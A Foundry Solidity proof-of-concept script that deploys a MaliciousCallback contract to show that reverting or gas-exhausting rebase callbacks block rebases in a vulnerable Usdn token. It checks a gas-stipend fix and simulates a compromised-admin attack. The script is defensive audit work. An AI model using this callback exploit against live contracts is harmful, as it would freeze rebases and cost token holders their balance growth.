// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Usdn/Usdn.sol";
import "../src/Usdn/UsdnFixed.sol";
import "../src/interfaces/Usdn/IRebaseCallback.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

/**
 * @title MaliciousCallback
 * @notice A malicious rebase callback contract designed to simulate attacks
 *         like reverting or consuming excessive gas during the rebase process.
 */
contract MaliciousCallback is IRebaseCallback {
    // Enum to define the type of attack the callback will perform.
    enum AttackType {
        NONE, // No attack, execute normally.
        REVERT, // Revert the transaction.
        GAS_EXHAUSTION // Enter an infinite loop to consume all gas.
    }

    // The currently configured attack type.
    AttackType public attackType;
    // The owner address allowed to change the attack type.
    address public owner;

    /**
     * @notice Constructor sets the deployer as the owner and initializes attack type to NONE.
     */
    constructor() {
        owner = msg.sender; // Set the contract deployer as the owner.
        attackType = AttackType.NONE; // Default to no attack.
    }

    /**
     * @notice Allows the owner to set the desired attack type.
     * @param _type The new attack type to set.
     */
    function setAttackType(AttackType _type) external {
        require(msg.sender == owner, "Not owner"); // Only the owner can change the attack type.
        attackType = _type; // Update the attack type.
    }

    /**
     * @notice The rebase callback function called by the Usdn contract during a rebase.
     *         Executes the configured attack (revert or gas exhaustion) or returns normally.
     * @return bytes Arbitrary data (only returned if attackType is NONE).
     */
    function rebaseCallback(
        uint256 /*oldDivisor*/,
        uint256 /*newDivisor*/
    ) external view override returns (bytes memory) {
        // Check if the attack type is set to REVERT.
        if (attackType == AttackType.REVERT) {
            revert("Malicious revert attack"); // Revert the transaction.
            // Check if the attack type is set to GAS_EXHAUSTION.
        } else if (attackType == AttackType.GAS_EXHAUSTION) {
            uint256 i = 0;
            // Infinite loop designed to consume all available gas.
            while (true) {
                i++; // Increment counter.
                // Perform some calculations to consume gas.
                uint256 x = i * i;
                x = (x * x) / 2 + 1;
                // Allocate memory dynamically to consume more gas.
                bytes memory expensiveMemoryAllocation = new bytes(i % 100);
                x = x + expensiveMemoryAllocation.length; // Use the allocated memory length to prevent optimization.
            }
        }

        // If attackType is NONE, return a success message.
        return abi.encode("Malicious callback executed normally");
    }
}

/**
 * @title FullRebaseExploitPoC
 * @notice Comprehensive Proof of Concept script demonstrating rebase callback
 *         vulnerabilities (revert & gas exhaustion) and verifying the gas stipend fix.
 *         Uses broadcast transactions for realistic simulation on a test network or fork.
 */
contract FullRebaseExploitPoC is Script, Test {
    // --- State Variables ---

    // Define deterministic addresses for actors using Foundry's vm.addr cheatcode.
    address deployer =
        vm.addr(uint256(keccak256(abi.encodePacked("deployer")))); // Address deploying contracts.
    address admin = address(1); // Generic admin address (used conceptually).
    address minter = address(2); // Address with minting privileges.
    address rebaser = address(3); // Address allowed to trigger rebases.
    address user1 = address(4); // Regular user address 1.
    address user2 = address(5); // Regular user address 2.

    // Contract instances to be deployed and interacted with.
    Usdn public usdnVulnerable; // Instance of the original, vulnerable Usdn contract.
    UsdnFixed public usdnFixed; // Instance of the fixed Usdn contract with gas stipend.
    MaliciousCallback public callback; // Instance of the malicious callback contract.

    // --- Test Results Tracking ---

    // Enum to represent the status of each test case.
    enum TestStatus {
        PENDING, // Test has not run yet.
        SUCCESS, // Test completed successfully according to expectations.
        FAILURE // Test did not meet expectations.
    }

    // Struct to store the results of each individual test function.
    struct TestResult {
        string description; // Name or description of the test case.
        TestStatus status; // Outcome of the test (SUCCESS/FAILURE).
        bool rebaseSucceeded; // Whether the rebase transaction itself completed without reverting.
        uint256 finalDivisor; // The Usdn divisor value after the test attempt.
        bytes callbackOutput; // Data returned or error captured from the callback interaction.
        string notes; // Explanatory notes about the expected vs. actual outcome.
    }
    // Array to store results from all executed tests.
    TestResult[] public results;

    // Declare constant at the contract level
    uint256 constant CORE_TEST_COUNT = 4;

    /**
     * @notice Deploys the necessary contracts (MaliciousCallback, Usdn, UsdnFixed)
     *         and mints initial tokens to users for testing.
     */
    function setUpContracts() internal {
        emit log_string("--- Deploying Contracts --- ");
        // Start broadcasting transactions from the deployer address.
        vm.startBroadcast(deployer);
        // Deploy the MaliciousCallback contract.
        callback = new MaliciousCallback();
        // Deploy the vulnerable Usdn contract, setting minter and rebaser roles.
        usdnVulnerable = new Usdn(minter, rebaser);
        // Deploy the fixed Usdn contract, setting minter and rebaser roles.
        usdnFixed = new UsdnFixed(minter, rebaser);
        // Stop broadcasting transactions.
        vm.stopBroadcast();

        // Log the deployment addresses.
        emit log_named_address(
            "MaliciousCallback deployed to",
            address(callback)
        );
        emit log_named_address(
            "Usdn (Vulnerable) deployed to",
            address(usdnVulnerable)
        );
        emit log_named_address(
            "UsdnFixed (Protected) deployed to",
            address(usdnFixed)
        );

        // Mint initial tokens to user1 and user2 in both Usdn versions.
        emit log_string("--- Minting Initial Tokens --- ");
        // Start broadcasting transactions from the minter address.
        vm.startBroadcast(minter);
        // Mint 1000 tokens to user1 in the vulnerable contract.
        usdnVulnerable.mint(user1, 1000 * 1e18);
        // Mint 500 tokens to user2 in the vulnerable contract.
        usdnVulnerable.mint(user2, 500 * 1e18);
        // Mint 1000 tokens to user1 in the fixed contract.
        usdnFixed.mint(user1, 1000 * 1e18);
        // Mint 500 tokens to user2 in the fixed contract.
        usdnFixed.mint(user2, 500 * 1e18);
        // Stop broadcasting transactions.
        vm.stopBroadcast();

        // Log initial balances for verification.
        emit log_named_uint(
            "User1 Initial Vulnerable Balance",
            usdnVulnerable.balanceOf(user1)
        );
        emit log_named_uint(
            "User1 Initial Fixed Balance",
            usdnFixed.balanceOf(user1)
        );
    }

    /**
     * @notice Tests the revert attack scenario on the vulnerable Usdn contract.
     *         Expects the rebase to fail and the divisor to remain unchanged.
     */
    function testVulnerableRevertAttack() internal {
        emit log_string("--- Testing Vulnerable Contract: Revert Attack --- ");
        // Record the initial divisor before the attack.
        uint256 initialDivisor = usdnVulnerable.divisor();
        // Flag to track if the rebase transaction reverted as expected.
        bool testFailed = false;
        // Variable to store any potential output (not expected here).
        bytes memory output;

        // Configure the MaliciousCallback to revert and set it as the handler for the vulnerable Usdn.
        vm.startBroadcast(deployer); // Use deployer (owner of callback) to set attack type.
        callback.setAttackType(MaliciousCallback.AttackType.REVERT); // Set attack to REVERT.
        usdnVulnerable.setRebaseHandler(callback); // Set the malicious callback as the handler.
        vm.stopBroadcast();
        emit log_string(
            "Malicious callback (REVERT) set as handler for Vulnerable contract."
        );

        // Attempt to perform a rebase, which should trigger the malicious callback and revert.
        uint256 targetDivisor = initialDivisor / 2; // Define a target divisor for the rebase.
        vm.startBroadcast(rebaser); // Rebase must be called by the rebaser address.
        // Use a try-catch block to handle the expected revert.
        try usdnVulnerable.rebase(targetDivisor) {
            // This block should not be reached if the attack is successful.
        } catch {
            // Catch the expected revert.
            testFailed = true; // Mark that the transaction failed as expected.
        }
        vm.stopBroadcast();

        // Verify the outcome: rebase should have failed, and the divisor should be unchanged.
        uint256 finalDivisor = usdnVulnerable.divisor(); // Get the divisor after the attempt.
        bool rebaseBlocked = (finalDivisor == initialDivisor); // Check if the divisor is unchanged.

        // Record the test result.
        results.push(
            TestResult(
                "Vulnerable - Revert Attack", // Test description.
                testFailed && rebaseBlocked // Test succeeds if rebase failed AND divisor is unchanged.
                    ? TestStatus.SUCCESS
                    : TestStatus.FAILURE,
                !testFailed, // `rebaseSucceeded` is true if the try block *didn't* catch (i.e., testFailed is false).
                finalDivisor, // Final divisor value.
                output, // Callback output (empty in case of revert).
                testFailed && rebaseBlocked // Notes explaining the result.
                    ? "Expected: Rebase failed due to revert, divisor unchanged."
                    : "Unexpected: Rebase succeeded or divisor changed."
            )
        );
        // Log the result notes.
        emit log_named_string("Result", results[results.length - 1].notes);
    }

    /**
     * @notice Tests the gas exhaustion attack scenario on the vulnerable Usdn contract.
     *         Expects the rebase to fail due to out-of-gas and the divisor to remain unchanged.
     */
    function testVulnerableGasExhaustionAttack() internal {
        emit log_string(
            "--- Testing Vulnerable Contract: Gas Exhaustion Attack --- "
        );
        // Record the initial divisor before the attack.
        uint256 initialDivisor = usdnVulnerable.divisor();
        // Flag to track if the rebase transaction failed (due to OOG).
        bool testFailed = false;
        // Variable to store any potential output (not expected here).
        bytes memory output;

        // Configure the MaliciousCallback for gas exhaustion.
        // Note: The handler was already set in the previous test, just need to change attack type.
        vm.startBroadcast(deployer); // Use deployer (owner of callback) to set attack type.
        callback.setAttackType(MaliciousCallback.AttackType.GAS_EXHAUSTION); // Set attack to GAS_EXHAUSTION.
        vm.stopBroadcast();
        emit log_string("Malicious callback configured for GAS_EXHAUSTION.");

        // Attempt to perform a rebase, which should run out of gas due to the malicious callback.
        uint256 targetDivisor = initialDivisor / 2; // Define a target divisor.
        vm.startBroadcast(rebaser); // Rebase must be called by the rebaser.
        // Use a try-catch block to handle the expected out-of-gas failure.
        try usdnVulnerable.rebase(targetDivisor) {
            // This block should not be reached.
        } catch {
            // Catch the expected failure (OOG is treated as a revert).
            testFailed = true; // Mark that the transaction failed as expected.
        }
        vm.stopBroadcast();

        // Verify the outcome: rebase should have failed, and the divisor should be unchanged.
        uint256 finalDivisor = usdnVulnerable.divisor(); // Get the divisor after the attempt.
        bool rebaseBlocked = (finalDivisor == initialDivisor); // Check if the divisor is unchanged.

        // Record the test result.
        results.push(
            TestResult(
                "Vulnerable - Gas Exhaustion Attack", // Test description.
                testFailed && rebaseBlocked // Test succeeds if rebase failed AND divisor is unchanged.
                    ? TestStatus.SUCCESS
                    : TestStatus.FAILURE,
                !testFailed, // `rebaseSucceeded` is true if the try block *didn't* catch.
                finalDivisor, // Final divisor value.
                output, // Callback output (empty in case of failure).
                testFailed && rebaseBlocked // Notes explaining the result.
                    ? "Expected: Rebase failed due to gas exhaustion, divisor unchanged."
                    : "Unexpected: Rebase succeeded or divisor changed."
            )
        );
        // Log the result notes.
        emit log_named_string("Result", results[results.length - 1].notes);
    }

    /**
     * @notice Tests the revert attack scenario on the fixed Usdn contract (with gas stipend).
     *         Expects the rebase to succeed, the divisor to change, but the callback failure to be caught and handled gracefully.
     */
    function testFixedRevertAttack() internal {
        emit log_string("--- Testing Fixed Contract: Revert Attack --- ");
        // Record the initial divisor.
        uint256 initialDivisor = usdnFixed.divisor();
        // Flag to track if the rebase transaction itself succeeded (despite callback revert).
        bool testSucceeded = false;
        // Variable to store the data returned by the rebase function (should indicate callback failure).
        bytes memory output = "";
        // Flag to check if the returned data indicates the callback was trapped.
        bool callbackTrapped = false;

        // Configure the MaliciousCallback to revert and set it as the handler for the fixed Usdn.
        vm.startBroadcast(deployer); // Use deployer (owner of callback).
        callback.setAttackType(MaliciousCallback.AttackType.REVERT); // Set attack to REVERT.
        usdnFixed.setRebaseHandler(callback); // Set the handler on the fixed contract.
        vm.stopBroadcast();
        emit log_string(
            "Malicious callback (REVERT) set as handler for Fixed contract."
        );

        // Attempt to perform a rebase. Expect the main rebase logic to succeed,
        // but the callback call within it to fail gracefully due to the gas stipend and try-catch.
        uint256 targetDivisor = initialDivisor / 2; // Define a target divisor.
        vm.startBroadcast(rebaser); // Rebase called by the rebaser.
        // Use try-catch to capture the return values or any unexpected errors from the rebase function itself.
        try usdnFixed.rebase(targetDivisor) returns (
            bool,
            uint256,
            bytes memory resultData
        ) {
            testSucceeded = true; // The rebase transaction itself completed.
            output = resultData; // Store the returned data.
            // Check if the returned data matches the expected "Callback failed" message (hashed for comparison).
            callbackTrapped =
                keccak256(resultData) ==
                keccak256(abi.encodePacked("Callback failed"));
        } catch Error(string memory reason) {
            // Catch unexpected reverts from the rebase function itself.
            testSucceeded = false; // Mark as unexpected failure.
            output = bytes(reason); // Store the error reason.
        } catch {
            // Catch other unexpected failures.
            testSucceeded = false; // Mark as unexpected failure.
        }
        vm.stopBroadcast();

        // Verify the outcome: rebase transaction succeeded, divisor changed, and callback failure was trapped.
        uint256 finalDivisor = usdnFixed.divisor(); // Get the final divisor.
        bool divisorChanged = (finalDivisor == targetDivisor); // Check if divisor matches the target.

        // Record the test result.
        results.push(
            TestResult(
                "Fixed - Revert Attack", // Test description.
                testSucceeded && divisorChanged && callbackTrapped // Test succeeds if rebase tx passed, divisor changed, AND callback was trapped.
                    ? TestStatus.SUCCESS
                    : TestStatus.FAILURE,
                testSucceeded, // Whether the rebase transaction itself succeeded.
                finalDivisor, // Final divisor value.
                output, // Data returned by rebase (should indicate trapped callback).
                testSucceeded && divisorChanged && callbackTrapped // Notes explaining the result.
                    ? "Expected: Rebase succeeded, divisor changed, callback trapped."
                    : "Unexpected: Rebase failed or divisor unchanged or callback not trapped."
            )
        );
        // Log the result notes.
        emit log_named_string("Result", results[results.length - 1].notes);
    }

    /**
     * @notice Tests the gas exhaustion attack scenario on the fixed Usdn contract.
     *         Expects the rebase to succeed, the divisor to change, and the callback failure (OOG) to be caught.
     */
    function testFixedGasExhaustionAttack() internal {
        emit log_string(
            "--- Testing Fixed Contract: Gas Exhaustion Attack --- "
        );
        // Record the initial divisor.
        uint256 initialDivisor = usdnFixed.divisor();
        // Flag to track if the rebase transaction itself succeeded.
        bool testSucceeded = false;
        // Variable to store the data returned by the rebase function.
        bytes memory output = "";
        // Flag to check if the callback failure was trapped.
        bool callbackTrapped = false;

        // Configure the MaliciousCallback for gas exhaustion.
        vm.startBroadcast(deployer); // Use deployer (owner of callback).
        callback.setAttackType(MaliciousCallback.AttackType.GAS_EXHAUSTION); // Set attack to GAS_EXHAUSTION.
        // Handler already set in the previous test for the fixed contract.
        vm.stopBroadcast();
        emit log_string("Malicious callback configured for GAS_EXHAUSTION.");

        // Attempt to perform a rebase. Expect the main logic to succeed,
        // with the callback running out of its stipend gas and being caught.
        uint256 targetDivisor = initialDivisor / 2; // Define a target divisor.
        vm.startBroadcast(rebaser); // Rebase called by the rebaser.
        // Use try-catch to capture return values or unexpected errors.
        try usdnFixed.rebase(targetDivisor) returns (
            bool,
            uint256,
            bytes memory resultData
        ) {
            testSucceeded = true; // Rebase transaction completed.
            output = resultData; // Store returned data.
            // Check if the returned data indicates the callback was trapped.
            callbackTrapped =
                keccak256(resultData) ==
                keccak256(abi.encodePacked("Callback failed"));
        } catch Error(string memory reason) {
            // Catch unexpected reverts.
            testSucceeded = false;
            output = bytes(reason);
        } catch {
            // Catch other unexpected failures.
            testSucceeded = false;
        }
        vm.stopBroadcast();

        // Verify the outcome: rebase transaction succeeded, divisor changed, callback trapped.
        uint256 finalDivisor = usdnFixed.divisor(); // Get final divisor.
        bool divisorChanged = (finalDivisor == targetDivisor); // Check if divisor changed correctly.

        // Record the test result.
        results.push(
            TestResult(
                "Fixed - Gas Exhaustion Attack", // Test description.
                testSucceeded && divisorChanged && callbackTrapped // Test succeeds if rebase tx passed, divisor changed, AND callback trapped.
                    ? TestStatus.SUCCESS
                    : TestStatus.FAILURE,
                testSucceeded, // Whether the rebase transaction itself succeeded.
                finalDivisor, // Final divisor value.
                output, // Data returned by rebase.
                testSucceeded && divisorChanged && callbackTrapped // Notes explaining the result.
                    ? "Expected: Rebase succeeded, divisor changed, callback trapped."
                    : "Unexpected: Rebase failed or divisor unchanged or callback not trapped."
            )
        );
        // Log the result notes.
        emit log_named_string("Result", results[results.length - 1].notes);
    }

    // --- Additional Severity Tests ---

    /**
     * @notice Simulates the economic impact over time if rebases are blocked on the vulnerable contract.
     *         It attempts several rebases (which fail due to the malicious callback) and tracks the divergence
     *         between the actual user balance and the balance they *should* have had if rebases succeeded.
     */
    function testEconomicImpactOverTime() internal {
        emit log_string(
            "\n--- Testing Economic Impact: Blocked Rebases (Vulnerable Contract) --- "
        );
        // Ensure the vulnerable contract uses the malicious callback set to REVERT.
        vm.startBroadcast(deployer);
        callback.setAttackType(MaliciousCallback.AttackType.REVERT); // Set attack to REVERT.
        usdnVulnerable.setRebaseHandler(callback); // Ensure handler is set (might be redundant but safe).
        vm.stopBroadcast();
        emit log_string(
            "Malicious callback (REVERT) set for Vulnerable contract."
        );

        // Get initial state for user1.
        uint256 initialUser1Shares = usdnVulnerable.sharesOf(user1); // User's underlying shares (constant).
        uint256 currentDivisor = usdnVulnerable.divisor(); // The current divisor.
        uint256 expectedDivisor = currentDivisor; // What the divisor *should* become.
        uint256 actualUser1Balance = usdnVulnerable.balanceOf(user1); // User's current balance.
        uint256 expectedUser1Balance = actualUser1Balance; // What the balance *should* become.

        // Log initial state.
        emit log_named_uint("Round 0 Initial Divisor", currentDivisor);
        emit log_named_uint("Round 0 Initial User1 Shares", initialUser1Shares);
        emit log_named_uint("Round 0 Actual User1 Balance", actualUser1Balance);

        // Simulate multiple rebase periods (e.g., 3 days).
        uint numRounds = 3;
        for (uint i = 1; i <= numRounds; i++) {
            // Advance time by 1 day using Foundry cheatcode.
            vm.warp(block.timestamp + 1 days);
            emit log_named_uint("\nAttempting Rebase Round", i);

            // Determine the target divisor for this round (e.g., halving it).
            // Note: In a real scenario, this would depend on external factors.
            uint256 targetDivisor = currentDivisor / 2;
            // Update the *expected* divisor if the rebase were to succeed.
            expectedDivisor = targetDivisor;

            // Attempt the rebase (expected to fail silently due to the reverting callback).
            vm.startBroadcast(rebaser);
            try usdnVulnerable.rebase(targetDivisor) {} catch {} // Catch the expected revert.
            vm.stopBroadcast();

            // Calculate the balance user1 *should* have if the rebase had succeeded.
            // Balance = Shares * 1e18 / Divisor
            expectedUser1Balance =
                (initialUser1Shares * 1e18) /
                expectedDivisor; // Use the *expected* divisor.

            // Get the actual state after the failed rebase attempt.
            currentDivisor = usdnVulnerable.divisor(); // The divisor remains unchanged.
            actualUser1Balance = usdnVulnerable.balanceOf(user1); // The balance remains unchanged.

            // Log the comparison for this round.
            emit log_named_uint("Round Expected Divisor", expectedDivisor);
            emit log_named_uint("Round Actual Divisor", currentDivisor); // Will be the old divisor.
            emit log_named_uint(
                "Round Expected User1 Balance",
                expectedUser1Balance
            );
            emit log_named_uint(
                "Round Actual User1 Balance",
                actualUser1Balance // Will be the old balance.
            );
            // Calculate and log the difference (economic loss) for this round.
            emit log_named_uint(
                "Round Balance Divergence",
                expectedUser1Balance > actualUser1Balance
                    ? expectedUser1Balance - actualUser1Balance
                    : 0 // Avoid underflow if expected < actual (shouldn't happen here)
            );
        }

        // Calculate the total divergence after all rounds.
        uint256 finalActualBalance = usdnVulnerable.balanceOf(user1);
        uint256 totalDivergence = expectedUser1Balance > finalActualBalance
            ? expectedUser1Balance - finalActualBalance
            : 0;

        // Log the final summary of the economic impact.
        emit log_string("\n--- Economic Impact Summary ---");
        emit log_named_uint(
            "Final Expected User1 Balance (if rebases worked)",
            expectedUser1Balance
        );
        emit log_named_uint(
            "Final Actual User1 Balance (rebases blocked)",
            finalActualBalance
        );
        emit log_named_uint(
            "Total Balance Divergence after rounds",
            totalDivergence
        );
        emit log_string(
            "Conclusion: Blocking rebases significantly harms users by preventing balance growth."
        );
    }

    /**
     * @notice Simulates an attack where a compromised admin sets a malicious rebase handler
     *         on the vulnerable contract to permanently block rebases.
     */
    function testAdminAttackScenario() internal {
        emit log_string(
            "\n--- Testing Admin Attack Scenario (Vulnerable Contract) --- "
        );
        // Define an address for the malicious admin.
        address maliciousAdmin = vm.addr(
            uint256(keccak256(abi.encodePacked("maliciousAdmin")))
        );
        emit log_named_address("Simulating Malicious Admin", maliciousAdmin);

        // Step 1: The current admin (deployer in this setup) grants the admin role to the malicious address.
        // This simulates an admin account being compromised or a rogue admin action.
        emit log_string(
            "Step 1: Original admin grants role to malicious admin..."
        );
        vm.startBroadcast(deployer); // The deployer initially holds the DEFAULT_ADMIN_ROLE.
        // Grant the role using the AccessControl function.
        usdnVulnerable.grantRole(
            usdnVulnerable.DEFAULT_ADMIN_ROLE(), // The role identifier.
            maliciousAdmin // The address to grant the role to.
        );
        vm.stopBroadcast();
        // Verify that the role grant was successful.
        require(
            usdnVulnerable.hasRole(
                usdnVulnerable.DEFAULT_ADMIN_ROLE(),
                maliciousAdmin
            ),
            "Malicious admin role grant failed"
        );
        emit log_string("Malicious admin granted DEFAULT_ADMIN_ROLE.");

        // Step 2a: The deployer (owner of the callback contract) sets the callback to revert mode.
        // This is necessary because only the callback owner can change its mode.
        emit log_string(
            "Step 2a: Deployer sets existing callback to REVERT mode..."
        );
        vm.startBroadcast(deployer);
        callback.setAttackType(MaliciousCallback.AttackType.REVERT);
        vm.stopBroadcast();
        emit log_string("Callback attack type set to REVERT by deployer.");

        // Step 2b: The now-privileged Malicious Admin sets the (reverting) callback as the rebase handler.
        // This is the malicious action enabled by the compromised admin role.
        emit log_string(
            "Step 2b: Malicious admin sets the reverting callback as handler..."
        );
        vm.startBroadcast(maliciousAdmin); // Action performed by the malicious admin.
        usdnVulnerable.setRebaseHandler(callback); // Set the handler using admin privileges.
        vm.stopBroadcast();
        // Verify that the handler was successfully set.
        require(
            address(usdnVulnerable.rebaseHandler()) == address(callback),
            "Malicious handler not set"
        );
        emit log_string(
            "Malicious callback set as handler by malicious admin."
        );

        // Step 3: The legitimate rebaser attempts to perform a rebase.
        // This attempt should now fail because the handler is the reverting callback.
        emit log_string(
            "Step 3: Original rebaser attempts rebase (should fail)..."
        );
        uint256 initialDivisor = usdnVulnerable.divisor(); // Record divisor before attempt.
        uint256 targetDivisor = initialDivisor / 2; // Define target divisor.
        bool failedAsExpected = false; // Flag to track if the revert occurred.

        vm.startBroadcast(rebaser); // Action performed by the legitimate rebaser.
        // Attempt the rebase and catch the expected revert.
        try usdnVulnerable.rebase(targetDivisor) {} catch {
            failedAsExpected = true; // Mark failure as expected.
        }
        vm.stopBroadcast();

        // Verify the outcome of the admin attack.
        uint256 finalDivisor = usdnVulnerable.divisor(); // Get divisor after attempt.
        emit log_string("--- Admin Attack Result ---");
        // Check if the rebase failed AND the divisor remained unchanged.
        if (failedAsExpected && finalDivisor == initialDivisor) {
            emit log_string(
                "SUCCESS: Rebase attempt failed as expected. Divisor unchanged."
            );
            emit log_string(
                "Conclusion: A compromised admin can permanently block the rebase function."
            );
        } else {
            // Log if the outcome was not as expected.
            emit log_string(
                "FAILURE: Rebase attempt succeeded or divisor changed unexpectedly."
            );
        }
        // Log final divisor state.
        emit log_named_uint("Initial Divisor", initialDivisor);
        emit log_named_uint("Final Divisor", finalDivisor);
    }

    // --- New Test: Minting Accounting Mismatch ---

    function testMintingAccountingMismatch() internal {
        console.log(
            "\n--- Testing Accounting Impact: Minting with Stale Divisor --- "
        );

        // Simulate time passing
        vm.warp(block.timestamp + 1 days);

        uint256 initialVulnerableDivisor = usdnVulnerable.divisor();
        uint256 initialFixedDivisor = usdnFixed.divisor();
        console.log("Initial Vulnerable Divisor", initialVulnerableDivisor);
        console.log("Initial Fixed Divisor", initialFixedDivisor);

        // Target divisor that should apply if rebase worked
        uint256 targetDivisor = initialFixedDivisor / 2; // Example divisor change
        console.log("Target Divisor for Rebase", targetDivisor);

        // 1. Attempt rebase on Vulnerable contract (will fail due to malicious handler)
        console.log("Attempting rebase on Vulnerable (expected fail)...");
        vm.startBroadcast(deployer); // Ensure callback is set by an admin first
        callback.setAttackType(MaliciousCallback.AttackType.REVERT);
        usdnVulnerable.setRebaseHandler(callback);
        vm.stopBroadcast();

        vm.startBroadcast(rebaser);
        try usdnVulnerable.rebase(targetDivisor) {
            // Should not succeed
        } catch {
            // Expected revert caught
        }
        vm.stopBroadcast();
        uint256 currentVulnerableDivisor = usdnVulnerable.divisor();
        assertEq(
            currentVulnerableDivisor,
            initialVulnerableDivisor,
            "Vulnerable divisor should not change"
        );
        console.log(
            "Current Vulnerable Divisor (Unchanged)",
            currentVulnerableDivisor
        );

        // 2. Attempt rebase on Fixed contract (should succeed)
        console.log("Attempting rebase on Fixed (expected success)...");
        vm.startBroadcast(deployer); // << Use deployer (admin) to clear the handler
        usdnFixed.setRebaseHandler(IRebaseCallback(address(0)));
        vm.stopBroadcast(); //<< End deployer broadcast

        vm.startBroadcast(rebaser); // Rebaser performs the rebase
        (bool successFixedRebase, , ) = usdnFixed.rebase(targetDivisor);
        assertTrue(successFixedRebase, "Fixed rebase should succeed");
        vm.stopBroadcast(); // << End rebaser broadcast

        uint256 currentFixedDivisor = usdnFixed.divisor();
        assertEq(
            currentFixedDivisor,
            targetDivisor,
            "Fixed divisor should change"
        );
        console.log("Current Fixed Divisor (Changed)", currentFixedDivisor);

        // 3. Mint the same amount of tokens on both contracts
        uint256 mintAmount = 100 * 1e18;
        console.log("\nMinting amount", mintAmount);

        // Mint on Vulnerable (uses stale divisor)
        vm.startBroadcast(minter); // Minter role needed
        uint256 sharesBeforeVulnerable = usdnVulnerable.sharesOf(user1);
        usdnVulnerable.mint(user1, mintAmount);
        uint256 sharesAfterVulnerable = usdnVulnerable.sharesOf(user1);
        vm.stopBroadcast();
        uint256 sharesMintedVulnerable = sharesAfterVulnerable -
            sharesBeforeVulnerable;
        console.log("Shares Minted (Vulnerable)", sharesMintedVulnerable);
        console.log(
            "Balance added (Vulnerable)",
            usdnVulnerable.convertToTokens(sharesMintedVulnerable)
        );

        // Mint on Fixed (uses updated divisor)
        vm.startBroadcast(minter); // Minter role needed
        uint256 sharesBeforeFixed = usdnFixed.sharesOf(user1);
        usdnFixed.mint(user1, mintAmount);
        uint256 sharesAfterFixed = usdnFixed.sharesOf(user1);
        vm.stopBroadcast();
        uint256 sharesMintedFixed = sharesAfterFixed - sharesBeforeFixed;
        console.log("Shares Minted (Fixed)", sharesMintedFixed);
        console.log(
            "Balance added (Fixed)",
            usdnFixed.convertToTokens(sharesMintedFixed)
        );

        // 4. Compare the shares minted
        console.log("\n--- Accounting Mismatch Summary ---");
        assertTrue(
            sharesMintedVulnerable != sharesMintedFixed,
            "Shares minted should differ due to divisor discrepancy"
        );
        console.log(
            "SUCCESS: Minting the same amount resulted in different shares credited."
        );
        console.log("Vulnerable Shares:", sharesMintedVulnerable);
        console.log("Fixed Shares:", sharesMintedFixed);
        uint256 expectedSharesVulnerable = usdnVulnerable.convertToShares(
            mintAmount
        );
        uint256 expectedSharesFixed = usdnFixed.convertToShares(mintAmount);
        assertEq(
            sharesMintedVulnerable,
            expectedSharesVulnerable,
            "Vulnerable shares calculation mismatch"
        );
        assertEq(
            sharesMintedFixed,
            expectedSharesFixed,
            "Fixed shares calculation mismatch"
        );
        console.log(
            "Conclusion: Stale divisor in the vulnerable contract leads to incorrect internal accounting upon minting."
        );
    }

    /**
     * @notice Main execution function for the script.
     *         Runs setup, executes all test scenarios, and provides a final summary.
     */
    function run() public {
        setUpContracts();

        // --- Execute Core Exploit/Fix Tests ---
        // Test the revert attack on the vulnerable contract.
        testVulnerableRevertAttack();
        // Test the gas exhaustion attack on the vulnerable contract.
        testVulnerableGasExhaustionAttack();
        // Test the revert attack on the fixed contract (verify fix).
        testFixedRevertAttack();
        // Test the gas exhaustion attack on the fixed contract (verify fix).
        testFixedGasExhaustionAttack();

        // --- Execute Additional Severity/Scenario Tests ---
        // Test the long-term economic impact of blocked rebases.
        testEconomicImpactOverTime();
        // Test the scenario where a compromised admin blocks rebases.
        testAdminAttackScenario();
        // Test the minting accounting mismatch.
        testMintingAccountingMismatch();

        // --- Final Summary ---
        emit log_string("\n--- CORE TESTS FINAL SUMMARY --- ");

        // Remove declaration from inside the function
        // uint constant CORE_TEST_COUNT = 4;
        uint successfulCoreTests = 0; // Counter for successful core tests.

        // Ensure we don't try to access results beyond the array bounds,
        // although CORE_TEST_COUNT should ideally match the number of core tests pushed.
        uint loopLimit = CORE_TEST_COUNT < results.length
            ? CORE_TEST_COUNT
            : results.length;

        // Iterate specifically through the core test results.
        for (uint i = 0; i < loopLimit; i++) {
            // Log the status of each core test.
            emit log_named_string(
                results[i].description, // Test name.
                results[i].status == TestStatus.SUCCESS ? "PASSED" : "FAILED" // Status string.
            );
            // Increment counter if the core test passed.
            if (results[i].status == TestStatus.SUCCESS) {
                successfulCoreTests++;
            }
        }

        // Log the total counts for core tests.
        emit log_named_uint("Total Core Tests Passed", successfulCoreTests);
        emit log_named_uint("Total Core Tests Run", CORE_TEST_COUNT); // Use the constant

        // Print a final conclusion based ONLY on the core test results.
        if (successfulCoreTests == CORE_TEST_COUNT) {
            emit log_string(
                "\nCORE VERIFICATION COMPLETE: All core tests passed. Gas stipend fix is effective."
            );
        } else {
            emit log_string(
                "\nCORE VERIFICATION FAILED: Some core tests did not pass. Review logs."
            );
        }

        // Note: Additional test results (Economic Impact, Admin Attack) are stored in the
        // `results` array but are not part of this core verification summary count.
        // Their individual success/failure can be seen in the logs above this summary.
    }
}
